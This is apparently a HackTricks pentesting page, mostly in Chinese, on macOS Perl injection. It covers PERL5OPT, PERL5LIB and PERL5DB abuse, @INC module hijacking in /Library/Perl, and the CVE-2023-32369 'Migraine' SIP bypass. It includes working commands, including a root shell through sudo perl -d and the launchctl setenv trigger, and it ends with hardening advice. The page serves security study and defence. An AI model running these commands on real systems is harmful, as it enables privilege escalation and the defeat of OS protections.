# macOS Perl Applications Injection

{{#include ../../../banners/hacktricks-training.md}}

## 通过 `PERL5OPT` 和 `PERL5LIB` 环境变量

使用环境变量 **`PERL5OPT`**，可以让 **Perl** 在解释器启动时执行任意命令（甚至在解析目标脚本的第一行之前）。
例如，创建以下脚本：
```perl:test.pl
#!/usr/bin/perl
print "Hello from the Perl script!\n";
```
现在**导出环境变量**并执行 **perl** 脚本：
```bash
export PERL5OPT='-Mwarnings;system("whoami")'
perl test.pl # This will execute "whoami"
```
另一种选择是创建一个 Perl 模块（例如 `/tmp/pmod.pm`）：
```perl:/tmp/pmod.pm
#!/usr/bin/perl
package pmod;
system('whoami');
1; # Modules must return a true value
```
然后使用环境变量，以便模块被自动定位并加载：
```bash
PERL5LIB=/tmp/ PERL5OPT=-Mpmod perl victim.pl
```
### Other interesting environment variables

* **`PERL5DB`** – 当解释器以 **`-d`**（debugger）标志启动时，`PERL5DB` 的内容会作为 Perl 代码在 *debugger context* 中执行。
如果你可以同时影响特权 Perl 进程的环境和命令行标志，就可以执行类似操作：

```bash
export PERL5DB='system("/bin/zsh")'
sudo perl -d /usr/bin/some_admin_script.pl   # will drop a shell before executing the script
```

* **`PERL5SHELL`** – 在 Windows 上，此变量控制 Perl 在需要 spawn shell 时使用的 shell executable。这里只为完整性而提及，因为它与 macOS 无关。

虽然 `PERL5DB` 需要 `-d` 开关，但 maintenance 或 installer scripts 经常以 *root* 身份并启用此标志执行，以便进行 verbose troubleshooting，因此该变量可作为有效的 escalation vector。

## Via dependencies (@INC abuse)

可以通过以下命令列出 Perl 将搜索的 include path（**`@INC`**）：
```bash
perl -e 'print join("\n", @INC)'
```
macOS 13/14 上的典型输出如下：
```bash
/Library/Perl/5.30/darwin-thread-multi-2level
/Library/Perl/5.30
/Network/Library/Perl/5.30/darwin-thread-multi-2level
/Network/Library/Perl/5.30
/Library/Perl/Updates/5.30.3
/System/Library/Perl/5.30/darwin-thread-multi-2level
/System/Library/Perl/5.30
/System/Library/Perl/Extras/5.30/darwin-thread-multi-2level
/System/Library/Perl/Extras/5.30
```
某些返回的文件夹甚至并不存在，不过 **`/Library/Perl/5.30`** 确实存在，它*不受* SIP 保护，并且位于受 SIP 保护的文件夹之前。因此，如果你能够以 *root* 身份写入，就可以放置一个恶意 module（例如 `File/Basename.pm`），这样任何导入该 module 的特权脚本都会*优先*加载它。

> [!WARNING]
> 你仍然需要 **root** 才能写入 `/Library/Perl`，并且 macOS 会显示一个 **TCC** 提示，要求为执行写入操作的进程授予*完全磁盘访问权限*。

例如，如果某个脚本导入了 **`use File::Basename;`**，就可以创建包含攻击者控制代码的 `/Library/Perl/5.30/File/Basename.pm`。

## 通过 Migration Assistant 绕过 SIP（CVE-2023-32369 “Migraine”）

2023 年 5 月，Microsoft 披露了 **CVE-2023-32369**，绰号 **Migraine**。这是一种 post-exploitation 技术，允许 *root* 攻击者完全**绕过系统完整性保护（SIP）**。
存在漏洞的组件是 **`systemmigrationd`**，这是一个具有 **`com.apple.rootless.install.heritable`** entitlement 的 daemon。该 daemon 生成的任何子进程都会继承此 entitlement，因此可以在 SIP 限制之外运行。<sup>[[1]](#references)</sup>

研究人员发现的子进程之一是这个由 Apple 签名的 interpreter：<sup>[[1]](#references)</sup>
```
/usr/bin/perl /usr/libexec/migrateLocalKDC …
```
由于 Perl 会遵循 `PERL5OPT`（而 Bash 会遵循 `BASH_ENV`），因此在不启用 SIP 的环境中，只需污染 daemon 的*环境变量*，就足以获得任意代码执行权限：<sup>[[1]](#references)[[2]](#references)</sup>
```bash
# As root
launchctl setenv PERL5OPT '-Mwarnings;system("/private/tmp/migraine.sh")'

# Trigger a migration (or just wait – systemmigrationd will eventually spawn perl)
open -a "Migration Assistant.app"   # or programmatically invoke /System/Library/PrivateFrameworks/SystemMigration.framework/Resources/MigrationUtility
```
当 `migrateLocalKDC` 运行时，`/usr/bin/perl` 会携带恶意的 `PERL5OPT` 启动，并在 SIP 重新启用*之前*执行 `/private/tmp/migraine.sh`。例如，你可以通过该脚本将 payload 复制到 **`/System/Library/LaunchDaemons`** 中，或为文件设置 `com.apple.rootless` extended attribute，使其**无法删除**。

Apple 已在 macOS **Ventura 13.4**、**Monterey 12.6.6** 和 **Big Sur 11.7.7** 中修复了该问题，但较旧或未打补丁的系统仍然容易受到攻击。<sup>[[1]](#references)</sup>

## 加固建议

1. **清除危险变量** – privileged launchdaemons 或 cron jobs 应使用干净的环境启动（`launchctl unsetenv PERL5OPT`、`env -i` 等）。
2. **避免以 root 身份运行 interpreters**，除非确有必要。使用 compiled binaries，或尽早 drop privileges。
3. **使用 `-T`（taint mode）运行 vendor scripts**，这样在启用 taint checking 时，Perl 会忽略 `PERL5OPT` 和其他不安全的 switches。
4. **保持 macOS 为最新版本** – “Migraine” 已在当前版本中完全修复。

## References

- [1] [Microsoft Security Blog – New macOS vulnerability, Migraine, could bypass System Integrity Protection (CVE-2023-32369)](https://www.microsoft.com/en-us/security/blog/2023/05/30/new-macos-vulnerability-migraine-could-bypass-system-integrity-protection/)
- [2] [Hackyboiz – macOS: Part1 - SIP Bypass](https://hackyboiz.github.io/2025/05/11/clalxk/MacOS_SIP-Bypass_en/)

{{#include ../../../banners/hacktricks-training.md}}
